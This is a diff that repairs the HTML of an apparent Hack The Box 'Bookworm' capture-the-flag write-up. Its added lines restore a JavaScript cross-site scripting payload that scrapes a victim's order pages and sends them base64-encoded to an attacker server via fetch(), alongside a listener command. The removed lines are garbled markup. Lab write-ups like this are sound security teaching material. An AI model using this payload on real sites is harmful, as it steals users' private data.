@@ -619,7 +619,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
   </strong>
   and then sends us the content of the pages in base64 encoding :
  </p>
- <pre class="code" id="c2c3be87-68f3-4d94-a558-26c4bb0fad30"><code>//Declare constants
+ <pre class="code" id="c2c3be87-68f3-4d94-a558-26c4bb0fad30"><code></code>//Declare constants
 const base_url = "http://bookworm.htb"
 const profile_url = base_url+"/profile";
 const attacker = "http://10.10.16.2";
@@ -630,7 +630,33 @@ function extractOrders(pageContent){
     var orders = new Array();
     //Process each lines of the data passed in the "pageContent" parameter
     //We start the loop at 1 to skip the line containing "Order History"
-    for(var i=1;i<lines.length;i++){ !="-1){" "="" ")="" "...="" "orders"="" 200...="" ?order_content="+btoa(request.responseText));
+    for(var i=1;i&lt;lines.length;i++){
+        var line = lines[i];
+        //If the line contains "/order/"...
+        if(line.indexOf("/order/") != -1){
+            //We extract the order id from the hyperlink
+            var string = line.split("/order/");
+            string = string[1].split("\"");
+            //Add the order number to the "orders" array
+            orders.push(string[0]);
+        }
+    }
+    //Return the list or order ids
+    return orders;
+}
+
+//Function used to extract the orders' page content
+function extractOrderPages(ordersArray){
+    for(var i=0;i&lt;ordersArray.length;i++){
+        //Send the request to the order page
+        var request = new XMLHttpRequest();
+        var url = base_url+"/order/"+ordersArray[i];
+        request.open('GET', url, false);
+        request.send(null);
+        //If we have HTTP response code 200...
+        if(request.status === 200){
+            //Send the content of the page in base64 encoding to the attacker web server
+            fetch(attacker+"/?order_content="+btoa(request.responseText));
         }
     }
 }
@@ -646,12 +672,13 @@ function getOrders(){
 }
 
 //Execute the exploit
-extractOrderPages(getOrders());&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p id=" add="" array="" attacker="" base64="" code="" contains="" content="" encoding="" extract="" extractorderpages(ordersarray){="" false);="" fetch(attacker+"="" ffb947bb-5330-422a-b264-6ddf073a1e5d"="" for(var="" from="" function="" have="" http="" hyperlink="" i="0;i&lt;ordersArray.length;i++){" id="" ids="" if="" if(line.indexof("="" if(request.status="200){" in="" line="" list="" number="" of="" or="" order="" orders'="" orders.push(string[0]);="" orders;="" page="" request="new" request.open('get',="" request.send(null);="" response="" return="" send="" server="" string='string[1].split("\"");' the="" to="" url='base_url+"/order/"+ordersArray[i];' url,="" used="" var="" we="" web="" xmlhttprequest();="" }="">
+extractOrderPages(getOrders());
+</pre>;
+<p>
 Now, we can update our <strong>profile picture</strong>
  with this exploit. Then, we can do all the previous steps to execute our <strong>JavaScript</strong>
  code on a victim web browser. Finally let’s take a look at our web server after waiting some time : 
+ </p>
 <pre class="code" id="49b1639a-7eef-4c1b-b914-faed6ec0f380"><code>┌──(kali㉿kali)-[~/…/HTB/CTF/Insane/Bookworm]
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
